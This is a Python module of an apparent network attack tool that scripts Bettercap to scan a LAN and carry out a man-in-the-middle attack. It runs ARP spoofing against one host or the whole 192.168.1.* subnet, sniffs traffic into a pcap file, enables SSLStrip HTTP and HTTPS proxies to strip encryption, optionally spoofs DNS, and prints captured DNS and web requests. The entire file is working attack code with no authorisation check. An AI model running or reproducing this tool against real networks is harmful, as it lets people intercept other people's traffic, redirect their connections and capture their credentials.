import json
import subprocess
import os
import time
import signal
import columnar
import re

from spartan.utils import post, get, delete_events

API_SETUP = 3
API_COOLDOWN = 3

# Get a JSON dump for all the clients of the local network
def get_net_json():
    # Start the Bettercap Ethernet module
    post('net.probe on')

    time.sleep(API_COOLDOWN)

    net_request = get('session/lan')
    net_json = json.loads(net_request.text)['hosts']

    return net_json

# Scan the local network for clients
def scan_net():
    print('\nScanning local network hosts...')

    net_json = get_net_json()

    if net_json:
        # Show the network hosts as a column
        net_data = []
        for host in net_json:
            net_data.append([host['ipv4'], host['mac'], host['hostname'], host['vendor']])

        headers = ['ip', 'mac', 'hostname', 'vendor']
        net_data.sort()
        net_table = columnar.columnar(net_data, headers, no_borders=True)
        print(net_table)
    else:
        print('Error scanning the network, check Internet connectivity.')
        exit()

# Get a list of the API event stream and display useful info
def spoof_summary():
    spoof_events = get('events')
    spoof_json = json.loads(spoof_events.text)

    show_events = ['net.sniff.dns', 'net.sniff.https', 'net.sniff.http.request', 'net.sniff.mdns']

    for event in spoof_json:
        if event['tag'] in show_events:
            message = event['data']['message']
            # Remove the ANSI escape sequences from a string
            reaesc = re.compile(r'\x1b[^m]*m')
            message = reaesc.sub('', message)
            print(message)

    delete_events()

# Full-duplex ARP spoofing to all hosts
def arp_spoof(args):
    post('net.probe on')

    if args.target == '*':
        print('\nARP Spoofing all network clients...')
    else:
        print('\nARP Spoofing ' + args.target + '...')

    post('set arp.spoof.internal true')
    #post('set arp.spoof.fullduplex true')

    if args.target == '*':
        post('set arp.spoof.targets 192.168.1.*')
    else:
        post('set arp.spoof.targets ' + args.target)

    # Generate a .pcap file where all the traffic is going to be logged
    pcap_file = './key_material/arp_spoof_' + time.strftime("%Y%m%d%H%M%S", time.gmtime()) + '.pcap'
    print('All traffic will be logged at: ' + pcap_file)
    post('set net.sniff.output ' + pcap_file)
    post('set net.sniff.local true')

    time.sleep(API_COOLDOWN)

    # Start HTTP and HTTPS proxies with SSLStrip deployed to attempt to decrypt HTTPS traffic
    if args.proxies:
        print('Deploying HTTP and HTTPS proxies with SSLStrip...')
        post('set http.proxy.sslstrip true')
        post('set https.proxy.sslstrip true')

        post('http.proxy on')
        post('https.proxy on')

    if args.dns:
        print('Spoofing DNS queries (redirections defined in dns.spoof.hosts file)')
        post('set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on')

    # Start the ARP Spoof + sniff the network
    post('arp.spoof on')
    post('net.sniff on')

    print('\nSniffing traffic...')
    while(True):
        time.sleep(API_COOLDOWN)
        spoof_summary()

# Start the local network scanner
def start_scan(args):
    bettercap = subprocess.Popen(['bettercap', '-caplet', 'http-ui'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(API_SETUP)

    try:
        scan_net()

    except Exception as e:
        print(e)

    finally:
        try:
            os.killpg(os.getpgid(bettercap.pid), signal.SIGTERM)
        except ProcessLookupError:
            exit()

# Start the MiTM Attack vector
def start_spy(args):
    bettercap = subprocess.Popen(['bettercap', '-caplet', 'http-ui'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(API_SETUP)

    try:
        net_json = get_net_json()
        client_exists = False
        for host in net_json:
            if host['ipv4'] == args.target:
                client_exists = True

        if client_exists:
            arp_spoof(args)

        else:
            print('\nClient does not exist.')
            exit()

    except Exception as e:
        print(e)

    finally:
        try:
            os.killpg(os.getpgid(bettercap.pid), signal.SIGTERM)
        except Exception as e:
            exit()
